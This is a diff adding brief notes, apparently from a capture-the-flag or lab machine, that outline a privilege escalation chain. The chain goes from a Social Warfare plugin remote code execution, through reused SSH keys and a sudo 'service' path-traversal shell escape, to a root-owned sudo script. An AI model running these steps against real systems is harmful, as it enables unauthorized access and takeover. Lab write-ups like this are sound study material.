@@ -1,0 +1,9 @@
+Social Warfare unauth rce -> www-data
+
+use ssh keys: www-data -> Max
+
+gtfobins service: Max -> Steven
+sudo -u steven service ../../bin/sh
+
+server-health.sh: Steven -> root
+sudo /opt/tools/server-health.sh
